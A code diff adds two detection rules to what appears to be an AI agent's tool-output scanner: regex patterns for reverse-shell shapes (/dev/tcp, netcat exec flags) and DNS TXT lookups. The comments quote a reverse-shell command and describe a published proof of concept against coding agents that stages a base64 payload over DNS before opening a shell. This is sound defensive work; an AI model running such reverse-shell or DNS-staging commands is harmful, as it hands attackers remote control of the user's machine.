@@ -74,6 +74,28 @@ const INJECTION_PATTERNS = [
         regex: /(169\.254\.169\.254|metadata\.google\.internal|fd00:ec2::254)/i,
         severity: "high",
     },
+    {
+        // Reverse-shell shapes that transit tool output — e.g. a script the
+        // agent `cat`s, or a decoded payload echoed to stdout. Anchored on the
+        // bash `/dev/tcp|/dev/udp` pseudo-device and netcat's execute flag,
+        // NOT on a bare `bash -i` (which appears in benign debugging docs).
+        // This is the shape of the Mozilla 0DIN "Axiom" clean-repo PoC's final
+        // stage (`bash -i >& /dev/tcp/<ip>/<port> 0>&1`). Near-zero false
+        // positive: `/dev/tcp` is essentially never used outside networking.
+        id: "reverse-shell",
+        regex: /\/dev\/(?:tcp|udp)\/|\bnc(?:at)?\b[^\n|]{0,80}(?:\s-e\b|\s--exec\b)/i,
+        severity: "high",
+    },
+    {
+        // DNS TXT-record lookup — the staging/exfil channel the 0DIN PoC uses
+        // to fetch its base64 payload without a plain HTTP request. Medium
+        // because TXT lookups have legitimate uses (SPF/DKIM debugging); this
+        // is a framing/telemetry signal, not a hard block. The `host` verb is
+        // gated behind `-t txt` so the English noun "host" doesn't false-fire.
+        id: "dns-txt-lookup",
+        regex: /\b(?:dig|nslookup|drill)\b[^\n]{0,120}\bTXT\b|\bhost\s+-t\s+txt\b/i,
+        severity: "medium",
+    },
 ];
 // Scan budget — cap at ~256 KB to keep hook latency bounded even when
 // a Bash command produces megabytes of stdout. Measured in characters
